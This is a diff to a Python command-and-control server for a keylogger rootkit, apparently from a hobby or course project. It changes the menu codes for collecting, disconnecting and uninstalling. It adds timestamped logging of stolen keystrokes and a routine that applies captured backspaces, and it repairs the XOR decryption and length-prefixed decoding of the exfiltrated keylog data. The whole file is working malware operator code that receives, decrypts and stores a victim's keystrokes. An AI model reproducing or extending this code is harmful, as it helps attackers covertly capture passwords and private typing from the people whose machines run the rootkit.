@@ -2,10 +2,12 @@
 import socket
 import enum
 import time
+from datetime import datetime
+from pytz import timezone
 
 COMMANDS_DICT = {'Collect': '1',
-                 'Uninstall': '2',
-                 'Disconnect': '3'
+                 'Disconnect': '2',
+                 'Uninstall': '3'
                  }
 
 class C2Server:
@@ -19,8 +21,8 @@ class C2Server:
         self.keylog_filepath    = 'keylog_data'
         self.commands = {
                          '1': self.collect,
-                         '2': self.uninstall,
-                         '3': self.disconnect
+                         '2': self.disconnect,
+                         '3': self.uninstall
                          }
 
     @staticmethod
@@ -36,8 +38,8 @@ class C2Server:
 #     #  ####   ####    #   #    # #   #      #     # ###### #    #  #### 
             
                         1: Collect Data
-                        2: Uninstall Rootkit
-                        3: Disconnect C2
+                        2: Disconnect C2
+                        3: Uninstall Rootkit
 :"""
             )
         return user_choice
@@ -57,8 +59,9 @@ class C2Server:
                     print(user_choice)
                 self.commands[user_choice]()
                 if user_choice in (COMMANDS_DICT['Uninstall'], COMMANDS_DICT['Disconnect']):
-                    print("DONE")
                     done = 1
+                    print("Shutting down")
+                user_choice = 0
 
     def collect(self):
         collect_byte = b'\x01'
@@ -66,16 +69,36 @@ class C2Server:
         if not rc:
             print("Error when collecting keylogged data: invalid ACK received...")
             return rc
-        keylog_data = decode_tlv()
+        keylog_data = self.decode_tlv()
         print("Keylog data: {0}".format(keylog_data))
+
+        user_choice = None
+        while user_choice not in ('Y', 'n'):
+            user_choice = input('Would you like the keylog data to be written with backspace\'d characters removed? (Y/n): ')
+
+        if user_choice == 'Y':
+            keylog_data = self.remove_backspace(keylog_data)
+            print("Keylog data with no backspaces: {0}".format(keylog_data))
+
         with open(self.keylog_filepath, 'a') as fp:
+            date_obj = datetime.now(tz=timezone('US/Eastern'))
+            fp.write(str(date_obj) + ': ')
             fp.write(keylog_data)
+            fp.write('\n')
         print("Keylog data successfully written to {0}".format(self.keylog_filepath))
         return True
 
+    def remove_backspace(self, data):
+        index = data.find('BACKSPACE')
+        if index == -1:
+            return data
+        parted = data.partition('BACKSPACE')
+        new_str = parted[0][:-1] + parted[2]
+        return self.remove_backspace(new_str)
+
     def uninstall(self):
         print("Sending uninstall command to rootkit...")
-        uninstall_byte = b'\x02'
+        uninstall_byte = b'\x03'
         rc = self.marshal_and_send(uninstall_byte, uninstall_byte)
         if not rc:
             print("Error when uninstall rootkit: invalid ACK received...")
@@ -84,7 +107,7 @@ class C2Server:
     
     def disconnect(self):
         print("Closing connection...")
-        disconnect_byte = b'\x03'
+        disconnect_byte = b'\x02'
         rc = self.marshal_and_send(disconnect_byte, disconnect_byte, check_ack=False)
         self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
@@ -95,7 +118,8 @@ class C2Server:
         if not check_ack:
             return True
 
-        ack = self.crypto(self.conn.recv(1))
+        enc_ack = self.conn.recv(1)
+        ack = self.crypto(enc_ack)
         if ack[0].to_bytes(1, byteorder='big') != ack_byte:
             print("Error with ack byte. Received: {0}, Expected: {1}".format(ack[0].to_bytes(1, byteorder='big'), ack_byte))
             return False
@@ -103,16 +127,18 @@ class C2Server:
 
     def crypto(self, message):
         message = bytearray(message)
-        final = bytearray()
-        for i, j in zip(message, self.key):
-            final.append(i ^ j)
-        return final
+        for i in range(0, len(message)):
+            message[i] = message[i] ^ self.key[i % len(self.key)]
 
-    def decode_tlv(self, tlv):
-        length = int.from_bytes(self.conn.recv(4), byteorder='big', signed=False)
+        return message
+
+    def decode_tlv(self):
+        enc_tlv_len = self.conn.recv(4)
+        tlv_len = self.crypto(enc_tlv_len)
+        length = int.from_bytes(tlv_len, byteorder='big', signed=False)
         encrypted_message = self.conn.recv(length)
         bytes_message = self.crypto(encrypted_message)
-        return bytes_message.encode('utf-8')
+        return bytes_message.decode('utf-8')
 
 
 if __name__ == "__main__":
